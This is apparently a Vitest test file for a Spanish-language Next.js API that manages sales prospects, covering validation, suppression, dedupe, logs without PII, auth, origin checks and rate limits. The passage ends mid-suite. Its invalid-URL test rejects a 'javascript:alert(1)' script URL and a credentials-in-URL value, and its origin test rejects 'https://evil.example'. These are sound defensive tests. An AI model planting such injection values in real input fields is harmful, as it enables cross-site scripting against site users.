import { readFileSync } from "node:fs"
import { join } from "node:path"
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest"
import { rateLimitDetalle, resetRateLimit } from "@/lib/rate-limit"
import { hashEmail } from "@/lib/propuestas/supresion"
import {
  PROSPECTO_MOTIVO_MAX,
  PROSPECTO_NOTA_MAX,
} from "@/lib/propuestas/validation"

/**
 * T-14 (AC-13, AC-14, AC-19; RF-18, RF-22): alta manual, correccion y
 * descarte de prospectos.
 *
 * Las tres rutas se ejercitan con Clerk, Prisma y logger mockeados:
 * - alta: procedencia obligatoria, sitios no prospectables, email con fuente,
 *   supresion, dedupe sin fusion, campana cancelada, auth/origen/rate;
 * - correccion: motivo obligatorio, campos permitidos, dominio recalculado,
 *   historial sin valores, email nuevo con fuente, supresion/duplicado;
 * - descarte: motivo, transicion atomica, cancelacion de envios pendientes.
 *
 * No se hace ninguna llamada real: `fetch` queda stubbeado y el test estatico
 * comprueba que las rutas no importan Places/Resend/web ni tocan el CRM.
 */

const mocks = vi.hoisted(() => {
  const tx = {
    prospecto: { updateMany: vi.fn() },
    envioPropuesta: { updateMany: vi.fn() },
  }

  return {
    auth: vi.fn(),
    clerkClient: vi.fn(),
    getUser: vi.fn(),
    campanaFindUnique: vi.fn(),
    prospectoFindMany: vi.fn(),
    prospectoFindUnique: vi.fn(),
    prospectoCreate: vi.fn(),
    prospectoUpdateMany: vi.fn(),
    supresionFindMany: vi.fn(),
    transaction: vi.fn(),
    tx,
    loggerInfo: vi.fn(),
    loggerError: vi.fn(),
    // T-15: colaboradores del analisis mockeados para no tocar red ni cupo real.
    fetchHtmlSeguro: vi.fn(),
    auditarPagina: vi.fn(),
    reservarCupo: vi.fn(),
  }
})

vi.mock("@clerk/nextjs/server", () => ({
  auth: mocks.auth,
  clerkClient: mocks.clerkClient,
}))

vi.mock("@/lib/prisma", () => ({
  prisma: {
    campanaProspeccion: { findUnique: mocks.campanaFindUnique },
    prospecto: {
      findMany: mocks.prospectoFindMany,
      findUnique: mocks.prospectoFindUnique,
      create: mocks.prospectoCreate,
      updateMany: mocks.prospectoUpdateMany,
    },
    supresionProspecto: { findMany: mocks.supresionFindMany },
    envioPropuesta: { updateMany: mocks.tx.envioPropuesta.updateMany },
    $transaction: mocks.transaction,
  },
}))

vi.mock("@/lib/logger", () => ({
  logger: {
    debug: vi.fn(),
    info: mocks.loggerInfo,
    warn: vi.fn(),
    error: mocks.loggerError,
  },
}))

// T-15: se conservan las funciones puras reales (extraccion/descubrimiento y
// `auditoriaVigente`) y se sustituyen solo los bordes de red y cupo.
vi.mock("@/lib/propuestas/web", async (importOriginal) => {
  const actual =
    await importOriginal<typeof import("@/lib/propuestas/web")>()
  return { ...actual, fetchHtmlSeguro: mocks.fetchHtmlSeguro }
})

vi.mock("@/lib/propuestas/auditoria", async (importOriginal) => {
  const actual =
    await importOriginal<typeof import("@/lib/propuestas/auditoria")>()
  return { ...actual, auditarPagina: mocks.auditarPagina }
})

vi.mock("@/lib/propuestas/consumo", async (importOriginal) => {
  const actual =
    await importOriginal<typeof import("@/lib/propuestas/consumo")>()
  return { ...actual, reservarCupo: mocks.reservarCupo }
})

import { POST as crearProspecto } from "@/app/api/propuestas/prospectos/route"
import { PATCH as corregirProspecto } from "@/app/api/propuestas/prospectos/[id]/route"
import { POST as descartarProspecto } from "@/app/api/propuestas/prospectos/[id]/descartar/route"
import { POST as analizarProspecto } from "@/app/api/propuestas/prospectos/[id]/analizar/route"
import { ErrorCupo } from "@/lib/propuestas/consumo"
import type { AuditoriaResumen } from "@/lib/propuestas/auditoria"
import type {
  MotivoFalloWeb,
  ResultadoWebError,
  ResultadoWebOk,
} from "@/lib/propuestas/web"

const ORIGEN = "https://pixelarch.dev"
const IP = "203.0.113.40"
const IP_RATE_LIMIT = "198.51.100.90"
const URL_API = `${ORIGEN}/api/propuestas/prospectos`
const SECRETO = "secreto-de-pruebas-propuestas-1234567890"
const BASE_LEGAL = "Base legal de prueba aprobada para prospeccion B2B."

const ENVS = [
  "NEXT_PUBLIC_URL",
  "PROPUESTAS_SECRETO",
  "PROPUESTAS_BASE_LEGAL",
] as const

type EntornoOriginal = Record<(typeof ENVS)[number], string | undefined>

interface CampanaBd {
  id: string
  estado: string
}

interface ProspectoBd {
  id: string
  estado: string
  nombreNegocio: string
  sitioWeb: string | null
  dominioNormalizado: string | null
  email: string | null
  telefono: string | null
  ciudad: string | null
  rubro: string | null
  contactoNombre: string | null
  contactoCargo: string | null
  fuenteUrl: string | null
  emailFuenteUrl: string | null
  historial: unknown[]
  // Campos de T-15 que `cargarProspecto` selecciona.
  emailFechaFuente: Date | null
  fechaFuente: Date | null
  fuenteTipo: string | null
  score: number | null
  scoreDetalle: unknown
  auditoriaResumen: unknown
  auditoriaEstado: string | null
  auditoriaFecha: Date | null
  posibleDuplicadoDeId: string | null
  campanaOrigenId: string
  campanaOrigen: {
    id: string
    nombre: string
    rubro: string | null
    zona: string | null
  }
}

interface SupresionFixture {
  ambito: "EMAIL" | "DOMINIO"
  emailHash?: string
  dominioNegocio?: string
}

let campanasBd: Map<string, CampanaBd>
let prospectosCreados: Array<Record<string, unknown>>
let supresiones: SupresionFixture[]
let fetchMock: ReturnType<typeof vi.fn>
let entornoOriginal: EntornoOriginal

function cuerpo(overrides: Record<string, unknown> = {}): Record<string, unknown> {
  return {
    campanaId: "camp_1",
    nombreNegocio: "Consultora Alfa",
    sitioWeb: "https://www.alfa.com.ar/contacto",
    email: "contacto@alfa.com.ar",
    telefono: "+54 11 5555 5555",
    ciudad: "Palermo, CABA",
    rubro: "Consultoría",
    fuenteUrl: "https://www.alfa.com.ar/contacto",
    emailFuenteUrl: "https://www.alfa.com.ar/equipo",
    nota: "Datos tomados de la página de contacto publicada por el negocio.",
    ...overrides,
  }
}

interface OpcionesPedido {
  origin?: string | null
  ip?: string | null
  rawBody?: string
}

function headersDe(opciones: OpcionesPedido): Headers {
  const headers = new Headers({ "content-type": "application/json" })
  if (opciones.origin !== null) {
    headers.set("origin", opciones.origin ?? ORIGEN)
  }
  if (opciones.ip !== null) {
    headers.set("x-forwarded-for", opciones.ip ?? IP)
  }
  return headers
}

function pedidoAlta(
  body: unknown = cuerpo(),
  opciones: OpcionesPedido = {},
): Request {
  return new Request(URL_API, {
    method: "POST",
    headers: headersDe(opciones),
    body: opciones.rawBody ?? JSON.stringify(body),
  })
}

function pedidoCorreccion(
  id: string,
  body: unknown,
  opciones: OpcionesPedido = {},
): Request {
  return new Request(`${URL_API}/${id}`, {
    method: "PATCH",
    headers: headersDe(opciones),
    body: opciones.rawBody ?? JSON.stringify(body),
  })
}

function pedidoDescarte(
  id: string,
  body: unknown,
  opciones: OpcionesPedido = {},
): Request {
  return new Request(`${URL_API}/${id}/descartar`, {
    method: "POST",
    headers: headersDe(opciones),
    body: opciones.rawBody ?? JSON.stringify(body),
  })
}

function contexto(id: string): { params: Promise<{ id: string }> } {
  return { params: Promise.resolve({ id }) }
}

function simularAdmin(
  role: unknown = "admin",
  userId = "user_1",
  nombre = "Ana Pérez",
): void {
  mocks.auth.mockResolvedValue({ userId })
  mocks.getUser.mockResolvedValue({
    id: userId,
    fullName: nombre,
    firstName: nombre.split(" ")[0],
    publicMetadata: { role },
  })
}

async function jsonDe(res: Response): Promise<Record<string, unknown>> {
  return (await res.json()) as Record<string, unknown>
}

function esperarNoStore(res: Response): void {
  expect(res.headers.get("cache-control")).toBe("no-store")
}

function primerArgumento(
  mock: ReturnType<typeof vi.fn>,
  indice = 0,
): Record<string, unknown> {
  const llamada = mock.mock.calls[indice] as unknown[] | undefined
  expect(llamada).toBeDefined()
  return llamada![0] as Record<string, unknown>
}

function datosDeCreacion(indice = 0): Record<string, unknown> {
  const args = primerArgumento(mocks.prospectoCreate, indice)
  return (args.data ?? {}) as Record<string, unknown>
}

function historialDe(data: Record<string, unknown>): Array<
  Record<string, unknown>
> {
  return (data.historial ?? []) as Array<Record<string, unknown>>
}

function instalarCampana(campana: CampanaBd): CampanaBd {
  campanasBd.set(campana.id, campana)
  return campana
}

function prospectoBd(overrides: Partial<ProspectoBd> = {}): ProspectoBd {
  return {
    id: "pros_1",
    estado: "NUEVO",
    nombreNegocio: "Consultora Alfa",
    sitioWeb: "https://alfa.com.ar/contacto",
    dominioNormalizado: "alfa.com.ar",
    email: "contacto@alfa.com.ar",
    telefono: "+541155555555",
    ciudad: "Palermo, CABA",
    rubro: "Consultoría",
    contactoNombre: null,
    contactoCargo: null,
    fuenteUrl: "https://alfa.com.ar/contacto",
    emailFuenteUrl: null,
    historial: [],
    emailFechaFuente: null,
    fechaFuente: new Date("2026-11-10T00:00:00.000Z"),
    fuenteTipo: "CARGA_MANUAL",
    score: null,
    scoreDetalle: null,
    auditoriaResumen: null,
    auditoriaEstado: null,
    auditoriaFecha: null,
    posibleDuplicadoDeId: null,
    campanaOrigenId: "camp_1",
    campanaOrigen: {
      id: "camp_1",
      nombre: "Estudios contables Palermo",
      rubro: "Consultoría",
      zona: "Palermo, CABA",
    },
    ...overrides,
  }
}

/**
 * Instala un prospecto para `findUnique`. La segunda busqueda por email
 * simula el duplicado exacto (si se indica) sin revelar su id en la respuesta.
 */
function configurarProspecto(
  fixture: ProspectoBd = prospectoBd(),
  duplicadoEmailId: string | null = null,
): void {
  mocks.prospectoFindUnique.mockImplementation(
    (args: { where?: Record<string, unknown> }) => {
      const where = args?.where ?? {}
      if (where.id === fixture.id) return Promise.resolve({ ...fixture })
      if (typeof where.email === "string") {
        return Promise.resolve(
          duplicadoEmailId ? { id: duplicadoEmailId } : null,
        )
      }
      return Promise.resolve(null)
    },
  )
}

function configurarSupresiones(fixtures: SupresionFixture[] = []): void {
  supresiones = fixtures

  mocks.supresionFindMany.mockImplementation(
    (args: {
      where?: {
        ambito?: string
        dominioNegocio?: { in?: string[] }
        OR?: Array<Record<string, unknown>>
      }
    }) => {
      const where = args?.where ?? {}

      // Comprobacion sin email: solo dominios de negocio.
      if (where.ambito === "DOMINIO") {
        const dominios = where.dominioNegocio?.in ?? []
        const filas = supresiones.filter(
          (fila) =>
            fila.ambito === "DOMINIO" &&
            typeof fila.dominioNegocio === "string" &&
            dominios.includes(fila.dominioNegocio),
        )
        return Promise.resolve(filas.map((_, indice) => ({ id: `sup_${indice}` })))
      }

      // Comprobacion con email: hash y dominios suprimibles en un OR.
      const condiciones = where.OR ?? []
      const filas = supresiones.filter((fila) =>
        condiciones.some((condicion) => {
          if (condicion.ambito !== fila.ambito) return false
          if (fila.ambito === "EMAIL") {
            return condicion.emailHash === fila.emailHash
          }
          return condicion.dominioNegocio === fila.dominioNegocio
        }),
      )

      return Promise.resolve(
        filas.map((fila) => ({
          ambito: fila.ambito,
          emailHash: fila.emailHash ?? null,
          dominioNegocio: fila.dominioNegocio ?? null,
        })),
      )
    },
  )
}

/* ------------------------------------------------------------------ */
/* Fixtures de T-15: web/auditoria/cupo                                 */
/* ------------------------------------------------------------------ */

const MARCADOR_HTML = "HTML_SECRETO_MARCADOR"

const HTML_HOME = [
  "<!doctype html>",
  '<html lang="es"><head>',
  "<title>Consultora Alfa | Inicio</title>",
  `<meta name="x-marcador" content="${MARCADOR_HTML}">`,
  "</head><body>",
  '<a href="mailto:Ventas@Alfa.com.ar">Escribinos</a>',
  '<a href="tel:+54 11 5555-1234">Llamanos</a>',
  "</body></html>",
].join("")

function homeOk(overrides: Partial<ResultadoWebOk> = {}): ResultadoWebOk {
  return {
    ok: true,
    html: HTML_HOME,
    finalUrl: "https://www.alfa.com.ar/",
    status: 200,
    headers: { "content-type": "text/html; charset=utf-8" },
    auditHeaders: {
      hsts: true,
      csp: false,
      xfo: false,
      xcto: true,
      referrer: false,
    },
    ttfbMs: 120,
    totalMs: 480,
    redirigido: false,
    redirects: [],
    https: true,
    htmlKb: 2,
    ...overrides,
  }
}

function homeError(motivo: MotivoFalloWeb): ResultadoWebError {
  return {
    ok: false,
    motivo,
    mensaje: `Fallo de prueba: ${motivo}`,
    status: null,
    redirigido: false,
    redirects: [],
  }
}

function auditoriaResumenOk(
  overrides: Partial<AuditoriaResumen> = {},
): AuditoriaResumen {
  return {
    estado: "OK",
    fecha: "2026-11-12T15:30:00.000Z",
    finalUrl: "https://www.alfa.com.ar/",
    scores: { velocidad: 40, ssl: 90, seo: 50, seguridad: 60 },
    findings: [
      { type: "warn", text: "La velocidad del sitio puede mejorar." },
    ],
    motivo: null,
    ...overrides,
  }
}

function prospectoAnalizable(
  overrides: Partial<ProspectoBd> = {},
): ProspectoBd {
  return prospectoBd({
    nombreNegocio: "Alfa",
    sitioWeb: "https://alfa.com.ar/",
    dominioNormalizado: "alfa.com.ar",
    email: null,
    telefono: null,
    emailFuenteUrl: null,
    emailFechaFuente: null,
    fuenteUrl: null,
    fechaFuente: null,
    fuenteTipo: "PLACES",
    score: null,
    scoreDetalle: null,
    auditoriaResumen: null,
    auditoriaEstado: null,
    auditoriaFecha: null,
    ...overrides,
  })
}

function pedidoAnalisis(id: string, opciones: OpcionesPedido = {}): Request {
  return new Request(`${URL_API}/${id}/analizar`, {
    method: "POST",
    headers: headersDe(opciones),
    body: "{}",
  })
}

function reservaDe(indice: number): Record<string, unknown> {
  const llamada = mocks.reservarCupo.mock.calls[indice] as unknown[] | undefined
  expect(llamada).toBeDefined()
  expect(llamada![0]).toBe(mocks.tx)
  return llamada![1] as Record<string, unknown>
}

function proveedoresReservados(): string[] {
  return mocks.reservarCupo.mock.calls.map(
    (llamada) => (llamada[1] as { proveedor: string }).proveedor,
  )
}

interface ActualizacionProspecto {
  where: Record<string, unknown>
  data: Record<string, unknown>
}

/**
 * Estados que el analisis nunca debe pisar. El updateMany los excluye siempre.
 */
const ESTADOS_NO_PISABLES = [
  "SUPRIMIDO",
  "DESCARTADO",
  "BORRADOR",
  "APROBADO",
  "ENVIADO",
  "RESPONDIO",
] as const

function actualizacionesProspecto(): ActualizacionProspecto[] {
  return mocks.prospectoUpdateMany.mock.calls.map((llamada) => {
    const args = llamada[0] as {
      where?: Record<string, unknown>
      data?: Record<string, unknown>
    }
    return { where: args.where ?? {}, data: args.data ?? {} }
  })
}

/**
 * Devuelve los datos del ultimo `updateMany` y exige la cantidad de updates
 * esperada: un NUEVO hace dos transiciones (NUEVO->ENRIQUECIDO->PUNTUADO) y el
 * resto de estados analizables persiste en un solo update.
 */
async function datosActualizados(veces = 1): Promise<Record<string, unknown>> {
  const actualizaciones = actualizacionesProspecto()
  expect(actualizaciones).toHaveLength(veces)
  return actualizaciones[actualizaciones.length - 1].data
}

beforeEach(() => {
  vi.clearAllMocks()

  entornoOriginal = {
    NEXT_PUBLIC_URL: process.env.NEXT_PUBLIC_URL,
    PROPUESTAS_SECRETO: process.env.PROPUESTAS_SECRETO,
    PROPUESTAS_BASE_LEGAL: process.env.PROPUESTAS_BASE_LEGAL,
  }
  process.env.NEXT_PUBLIC_URL = ORIGEN
  process.env.PROPUESTAS_SECRETO = SECRETO
  process.env.PROPUESTAS_BASE_LEGAL = BASE_LEGAL

  campanasBd = new Map()
  instalarCampana({ id: "camp_1", estado: "BORRADOR" })
  prospectosCreados = []
  supresiones = []

  simularAdmin()
  mocks.clerkClient.mockResolvedValue({
    users: { getUser: mocks.getUser },
  })

  mocks.campanaFindUnique.mockImplementation(
    (args: { where?: { id?: string } }) => {
      const id = args?.where?.id
      const campana =
        typeof id === "string" ? campanasBd.get(id) : undefined
      return Promise.resolve(campana ? { ...campana } : null)
    },
  )

  mocks.prospectoFindMany.mockResolvedValue([])
  mocks.prospectoFindUnique.mockResolvedValue(null)
  mocks.prospectoUpdateMany.mockResolvedValue({ count: 1 })

  mocks.fetchHtmlSeguro.mockReset()
  mocks.auditarPagina.mockReset()
  mocks.reservarCupo.mockReset()
  mocks.fetchHtmlSeguro.mockResolvedValue(homeOk())
  mocks.auditarPagina.mockResolvedValue(auditoriaResumenOk())
  mocks.reservarCupo.mockResolvedValue({ restantes: 99 })

  mocks.prospectoCreate.mockImplementation(
    (args: { data: Record<string, unknown> }) => {
      prospectosCreados.push(args.data)
      return Promise.resolve({
        id: `pros_${prospectosCreados.length}`,
        estado: String(args.data.estado ?? "NUEVO"),
      })
    },
  )

  configurarSupresiones([])

  mocks.tx.prospecto.updateMany.mockResolvedValue({ count: 1 })
  mocks.tx.envioPropuesta.updateMany.mockResolvedValue({ count: 2 })
  mocks.transaction.mockImplementation(
    (callback: (tx: typeof mocks.tx) => Promise<unknown>) => callback(mocks.tx),
  )

  for (const clave of [
    "propuestas:user_1",
    "propuestas:user_2",
    "propuestas:user_3",
    "propuestas:analisis:user_1",
    `propuestas:ip:${IP}`,
    `propuestas:ip:${IP_RATE_LIMIT}`,
  ]) {
    resetRateLimit(clave)
  }

  // Ninguna prueba puede salir a la red.
  fetchMock = vi.fn()
  vi.stubGlobal("fetch", fetchMock)
})

afterEach(() => {
  vi.unstubAllGlobals()

  for (const clave of ENVS) {
    const valor = entornoOriginal[clave]
    if (valor === undefined) {
      delete process.env[clave]
    } else {
      process.env[clave] = valor
    }
  }
})

/* ------------------------------------------------------------------ */
/* T-14 (AC-13, AC-14, AC-19): POST /api/propuestas/prospectos          */
/* ------------------------------------------------------------------ */

describe("POST /api/propuestas/prospectos - alta manual (AC-13, AC-19)", () => {
  it("crea el prospecto con procedencia, fuente, dominio e historial sin PII (AC-13)", async () => {
    const res = await crearProspecto(pedidoAlta())

    expect(res.status).toBe(201)
    esperarNoStore(res)
    await expect(jsonDe(res)).resolves.toEqual({
      id: "pros_1",
      estado: "NUEVO",
    })

    const data = datosDeCreacion()
    expect(data).toMatchObject({
      nombreNegocio: "Consultora Alfa",
      sitioWeb: "https://alfa.com.ar/contacto",
      dominioNormalizado: "alfa.com.ar",
      ciudad: "Palermo, CABA",
      rubro: "Consultoría",
      telefono: "+54 11 5555 5555",
      email: "contacto@alfa.com.ar",
      emailFuenteUrl: "https://www.alfa.com.ar/equipo",
      fuenteTipo: "CARGA_MANUAL",
      fuenteUrl: "https://www.alfa.com.ar/contacto",
      estado: "NUEVO",
      notas: "Datos tomados de la página de contacto publicada por el negocio.",
      baseLegal: BASE_LEGAL,
      notaLegal: null,
      posibleDuplicadoDeId: null,
      actualizadoPor: "user_1",
      campanaOrigenId: "camp_1",
      fechaFuente: expect.any(Date),
      emailFechaFuente: expect.any(Date),
      ultimaInteraccionEn: expect.any(Date),
    })
    expect(data).not.toHaveProperty("placeId")

    const historial = historialDe(data)
    expect(historial).toHaveLength(1)
    expect(historial[0]).toMatchObject({
      accion: "CREACION",
      por: "user_1",
      en: expect.any(String),
    })

    const crudoHistorial = JSON.stringify(historial)
    expect(crudoHistorial).not.toContain("Consultora Alfa")
    expect(crudoHistorial).not.toContain("contacto@alfa.com.ar")
    expect(crudoHistorial).not.toContain("5555")
    expect(crudoHistorial).not.toContain("https://")

    expect(fetchMock).not.toHaveBeenCalled()
    expect(mocks.loggerInfo).toHaveBeenCalledTimes(1)
    const crudoLogs = JSON.stringify(mocks.loggerInfo.mock.calls)
    expect(crudoLogs).not.toContain("Consultora Alfa")
    expect(crudoLogs).not.toContain("contacto@alfa.com.ar")
    expect(crudoLogs).not.toContain("Página de contacto")
    expect(crudoLogs).not.toContain("https://www.alfa.com.ar")
  })

  it("normaliza email a lowercase, recorta espacios y guarda la fuente del email (AC-13)", async () => {
    const res = await crearProspecto(
      pedidoAlta(
        cuerpo({
          nombreNegocio: "  Consultora Alfa  ",
          email: "  Contacto@Alfa.com.ar  ",
          emailFuenteUrl: "  https://www.alfa.com.ar/equipo  ",
          nota: "  Datos públicos verificados en la web.  ",
        }),
      ),
    )

    expect(res.status).toBe(201)
    const data = datosDeCreacion()
    expect(data.email).toBe("contacto@alfa.com.ar")
    expect(data.emailFuenteUrl).toBe("https://www.alfa.com.ar/equipo")
    expect(data.nombreNegocio).toBe("Consultora Alfa")
    expect(data.notas).toBe("Datos públicos verificados en la web.")
  })

  it("devuelve 400 VALIDACION si falta la nota (AC-13)", async () => {
    const res = await crearProspecto(pedidoAlta(cuerpo({ nota: undefined })))

    expect(res.status).toBe(400)
    esperarNoStore(res)
    expect(await jsonDe(res)).toMatchObject({ codigo: "VALIDACION" })
    expect(mocks.prospectoCreate).not.toHaveBeenCalled()
  })

  it("devuelve 400 VALIDACION si la nota supera el maximo (AC-13)", async () => {
    const res = await crearProspecto(
      pedidoAlta(cuerpo({ nota: "x".repeat(PROSPECTO_NOTA_MAX + 1) })),
    )

    expect(res.status).toBe(400)
    expect((await jsonDe(res)).codigo).toBe("VALIDACION")
    expect(mocks.prospectoCreate).not.toHaveBeenCalled()
  })

  it("devuelve 400 VALIDACION sin fuente aunque haya nota (AC-13)", async () => {
    const res = await crearProspecto(
      pedidoAlta(
        cuerpo({ fuenteUrl: undefined, emailFuenteUrl: undefined }),
      ),
    )

    expect(res.status).toBe(400)
    esperarNoStore(res)
    expect((await jsonDe(res)).codigo).toBe("VALIDACION")
    expect(mocks.prospectoCreate).not.toHaveBeenCalled()
  })

  it("devuelve 400 VALIDACION si faltan la nota y la fuente a la vez (AC-13)", async () => {
    const res = await crearProspecto(
      pedidoAlta(
        cuerpo({
          nota: undefined,
          fuenteUrl: undefined,
          emailFuenteUrl: undefined,
        }),
      ),
    )

    expect(res.status).toBe(400)
    esperarNoStore(res)
    expect((await jsonDe(res)).codigo).toBe("VALIDACION")
    expect(mocks.prospectoCreate).not.toHaveBeenCalled()
  })

  it("rechaza un body array o de importacion masiva con 400 (AC-13)", async () => {
    const res = await crearProspecto(pedidoAlta([cuerpo(), cuerpo()]))

    expect(res.status).toBe(400)
    expect((await jsonDe(res)).codigo).toBe("VALIDACION")
    expect(mocks.prospectoCreate).not.toHaveBeenCalled()
  })

  it.each([
    ["facebook", "https://www.facebook.com/consultora-alfa"],
    ["instagram", "https://www.instagram.com/consultora-alfa"],
    ["linkedin", "https://www.linkedin.com/company/consultora-alfa"],
    ["linktree", "https://linktr.ee/consultora-alfa"],
    ["mercadolibre", "https://www.mercadolibre.com.ar/consultora-alfa"],
    ["gmail", "https://www.gmail.com/consultora-alfa"],
    ["paginasamarillas", "https://www.paginasamarillas.com.ar/consultora-alfa"],
  ])(
    "rechaza un sitio no prospectable (%s) con 400 VALIDACION (AC-19)",
    async (_etiqueta, sitioWeb) => {
      const res = await crearProspecto(
        pedidoAlta(cuerpo({ sitioWeb, fuenteUrl: sitioWeb })),
      )

      expect(res.status).toBe(400)
      esperarNoStore(res)
      expect((await jsonDe(res)).codigo).toBe("VALIDACION")
      expect(mocks.prospectoCreate).not.toHaveBeenCalled()
    },
  )

  it("rechaza URLs invalidas o no http/https con 400 (AC-19)", async () => {
    for (const sitioWeb of [
      "no-es-url",
      "ftp://alfa.com.ar/contacto",
      "javascript:alert(1)",
      "https://user:pass@alfa.com.ar/contacto",
    ]) {
      const res = await crearProspecto(pedidoAlta(cuerpo({ sitioWeb })))
      expect(res.status, sitioWeb).toBe(400)
      expect((await jsonDe(res)).codigo, sitioWeb).toBe("VALIDACION")
    }

    expect(mocks.prospectoCreate).not.toHaveBeenCalled()
  })

  it("exige emailFuenteUrl cuando el email no pertenece al dominio del sitio (AC-19)", async () => {
    const sinFuente = await crearProspecto(
      pedidoAlta(
        cuerpo({ email: "ventas@beta.com.ar", emailFuenteUrl: undefined }),
      ),
    )
    expect(sinFuente.status).toBe(400)
    expect((await jsonDe(sinFuente)).codigo).toBe("VALIDACION")
    expect(mocks.prospectoCreate).not.toHaveBeenCalled()

    const conFuente = await crearProspecto(
      pedidoAlta(
        cuerpo({
          email: "ventas@beta.com.ar",
          emailFuenteUrl: "https://beta.com.ar/contacto",
        }),
      ),
    )
    expect(conFuente.status).toBe(201)
    expect(datosDeCreacion()).toMatchObject({
      email: "ventas@beta.com.ar",
      emailFuenteUrl: "https://beta.com.ar/contacto",
    })
  })

  it("exige fuente propia para un email publico cuando no hay sitio (AC-19)", async () => {
    const sinFuente = await crearProspecto(
      pedidoAlta(
        cuerpo({
          sitioWeb: undefined,
          email: "contacto@gmail.com",
          fuenteUrl: "https://gmail.com/contacto",
          emailFuenteUrl: undefined,
        }),
      ),
    )
    expect(sinFuente.status).toBe(400)
    expect((await jsonDe(sinFuente)).codigo).toBe("VALIDACION")
    expect(mocks.prospectoCreate).not.toHaveBeenCalled()

    const conFuente = await crearProspecto(
      pedidoAlta(
        cuerpo({
          sitioWeb: undefined,
          email: "contacto@gmail.com",
          fuenteUrl: "https://gmail.com/contacto",
          emailFuenteUrl: "https://gmail.com/contacto",
        }),
      ),
    )
    expect(conFuente.status).toBe(201)
    expect(datosDeCreacion()).toMatchObject({
      dominioNormalizado: null,
      email: "contacto@gmail.com",
    })
  })

  it("rechaza un email suprimido por hash con 409 SUPRIMIDO (AC-15, AC-19)", async () => {
    configurarSupresiones([
      {
        ambito: "EMAIL",
        emailHash: hashEmail("contacto@alfa.com.ar", SECRETO),
      },
    ])

    const res = await crearProspecto(pedidoAlta())

    expect(res.status).toBe(409)
    esperarNoStore(res)
    expect(await jsonDe(res)).toMatchObject({ codigo: "SUPRIMIDO" })
    expect(mocks.prospectoCreate).not.toHaveBeenCalled()
  })

  it("rechaza un dominio suprimido con 409 SUPRIMIDO (AC-14, AC-19)", async () => {
    configurarSupresiones([
      { ambito: "DOMINIO", dominioNegocio: "alfa.com.ar" },
    ])

    const res = await crearProspecto(pedidoAlta())

    expect(res.status).toBe(409)
    expect((await jsonDe(res)).codigo).toBe("SUPRIMIDO")
    expect(mocks.prospectoCreate).not.toHaveBeenCalled()
  })

  it("tambien bloquea por dominio cuando el alta no trae email (AC-14)", async () => {
    configurarSupresiones([
      { ambito: "DOMINIO", dominioNegocio: "alfa.com.ar" },
    ])

    const res = await crearProspecto(
      pedidoAlta(
        cuerpo({ email: undefined, emailFuenteUrl: undefined }),
      ),
    )

    expect(res.status).toBe(409)
    expect((await jsonDe(res)).codigo).toBe("SUPRIMIDO")
    expect(mocks.prospectoCreate).not.toHaveBeenCalled()
  })

  it("sin PROPUESTAS_SECRETO y con email falla cerrado con 503 NO_CONFIGURADO (AC-42)", async () => {
    delete process.env.PROPUESTAS_SECRETO

    const res = await crearProspecto(pedidoAlta())

    expect(res.status).toBe(503)
    esperarNoStore(res)
    expect(await jsonDe(res)).toMatchObject({ codigo: "NO_CONFIGURADO" })
    expect(mocks.prospectoCreate).not.toHaveBeenCalled()
  })

  it("responde 409 ESTADO sin datos si el email exacto ya existe (AC-14)", async () => {
    mocks.prospectoFindMany.mockResolvedValue([
      {
        id: "pros_existente",
        email: "contacto@alfa.com.ar",
        dominioNormalizado: "alfa.com.ar",
      },
    ])

    const res = await crearProspecto(pedidoAlta())

    expect(res.status).toBe(409)
    esperarNoStore(res)
    const json = await jsonDe(res)
    expect(json).toMatchObject({ codigo: "ESTADO" })
    expect(Object.keys(json).sort()).toEqual(["codigo", "error"])
    expect(JSON.stringify(json)).not.toContain("pros_existente")
    expect(JSON.stringify(json)).not.toContain("contacto@alfa.com.ar")
    expect(mocks.prospectoCreate).not.toHaveBeenCalled()
  })

  it("crea un prospecto nuevo marcado como posible duplicado si el dominio existe (AC-14)", async () => {
    mocks.prospectoFindMany.mockResolvedValue([
      {
        id: "pros_previo",
        email: "otro@alfa.com.ar",
        dominioNormalizado: "alfa.com.ar",
      },
    ])

    const res = await crearProspecto(
      pedidoAlta(cuerpo({ email: "ventas@alfa.com.ar" })),
    )

    expect(res.status).toBe(201)
    expect(mocks.prospectoCreate).toHaveBeenCalledTimes(1)
    expect(datosDeCreacion()).toMatchObject({
      dominioNormalizado: "alfa.com.ar",
      posibleDuplicadoDeId: "pros_previo",
    })
    // Nunca se fusiona: no se actualiza el prospecto existente.
    expect(mocks.prospectoUpdateMany).not.toHaveBeenCalled()
    expect(mocks.tx.prospecto.updateMany).not.toHaveBeenCalled()
  })

  it("responde 404 si la campana no existe (AC-13)", async () => {
    campanasBd.clear()

    const res = await crearProspecto(
      pedidoAlta(cuerpo({ campanaId: "camp_inexistente" })),
    )

    expect(res.status).toBe(404)
    esperarNoStore(res)
    expect((await jsonDe(res)).codigo).toBe("NO_ENCONTRADO")
    expect(mocks.prospectoCreate).not.toHaveBeenCalled()
  })

  it("responde 409 si la campana esta CANCELADA (AC-13)", async () => {
    instalarCampana({ id: "camp_1", estado: "CANCELADA" })

    const res = await crearProspecto(pedidoAlta())

    expect(res.status).toBe(409)
    expect((await jsonDe(res)).codigo).toBe("ESTADO")
    expect(mocks.prospectoCreate).not.toHaveBeenCalled()
  })
})

describe("POST /api/propuestas/prospectos - auth, origen y rate (AC-13)", () => {
  it("sin sesion responde 401 NO_AUTORIZADO", async () => {
    mocks.auth.mockResolvedValue({ userId: null })

    const res = await crearProspecto(pedidoAlta())

    expect(res.status).toBe(401)
    esperarNoStore(res)
    expect(await jsonDe(res)).toMatchObject({ codigo: "NO_AUTORIZADO" })
    expect(mocks.clerkClient).not.toHaveBeenCalled()
    expect(mocks.campanaFindUnique).not.toHaveBeenCalled()
  })

  it("la asistente responde 403 PROHIBIDO", async () => {
    simularAdmin("asistente")

    const res = await crearProspecto(pedidoAlta())

    expect(res.status).toBe(403)
    esperarNoStore(res)
    expect(await jsonDe(res)).toMatchObject({ codigo: "PROHIBIDO" })
    expect(mocks.campanaFindUnique).not.toHaveBeenCalled()
  })

  it("rechaza origen ausente o cross-site con 403 ORIGEN_INVALIDO", async () => {
    for (const opciones of [
      { origin: null },
      { origin: "https://evil.example" },
    ]) {
      const res = await crearProspecto(pedidoAlta(cuerpo(), opciones))
      expect(res.status, JSON.stringify(opciones)).toBe(403)
      expect((await jsonDe(res)).codigo).toBe("ORIGEN_INVALIDO")
    }

    expect(mocks.campanaFindUnique).not.toHaveBeenCalled()
  })

